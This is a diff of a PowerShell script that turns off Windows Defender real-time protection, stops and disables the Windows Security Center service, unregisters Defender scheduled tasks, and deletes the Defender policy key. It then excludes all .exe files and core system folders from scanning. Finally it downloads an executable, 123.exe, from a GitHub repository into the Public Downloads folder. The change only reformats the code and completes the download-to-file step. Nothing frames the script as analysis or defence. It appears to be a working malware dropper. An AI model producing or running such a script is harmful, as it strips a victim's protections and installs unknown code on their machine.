@@ -1,8 +1,14 @@
-Set-MpPreference -DisableRealtimeProtection$true; Set-MpPreference -MpServiceConfigurationLevel 0
-Get-Service wscsvc | Set-Service -Status Stopped; Set-Service wscsvc -StartupType Disabled
-Get-ScheduledTask*Microsoft*Windows*Defender* | Unregister-ScheduledTask 
-Remove-Item"HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force
+Set-MpPreference -DisableRealtimeProtection $true
+Set-MpPreference -MpServiceConfigurationLevel 0
 
-Add-MpPreference -ExclusionExtension '.exe'; Add-MpPreference -ExclusionPath 'C:\ProgramData', 'C:\Users\Public\Downloads', 'C:\Windows\System32', 'C:\Windows\SysWOW64', 'C:\Windows'
+Get-Service wscsvc | Set-Service -Status Stopped
+Set-Service wscsvc -StartupType Disabled
 
-Invoke-WebRequest https://github.com/AmjadBalls/TEST/raw/refs/heads/main/123.exe
+Get-ScheduledTask | Where-Object { $_.TaskName -like "*Microsoft*" -and $_.TaskName -like "*Windows*" -and $_.TaskName -like "*Defender*" } | Unregister-ScheduledTask
+
+Remove-Item "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force
+
+Add-MpPreference -ExclusionExtension '.exe'
+Add-MpPreference -ExclusionPath 'C:\ProgramData', 'C:\Users\Public\Downloads', 'C:\Windows\System32', 'C:\Windows\SysWOW64', 'C:\Windows'
+
+Invoke-WebRequest -Uri "https://github.com/AmjadBalls/TEST/raw/refs/heads/main/123.exe" -OutFile "C:\Users\Public\Downloads\123.exe"
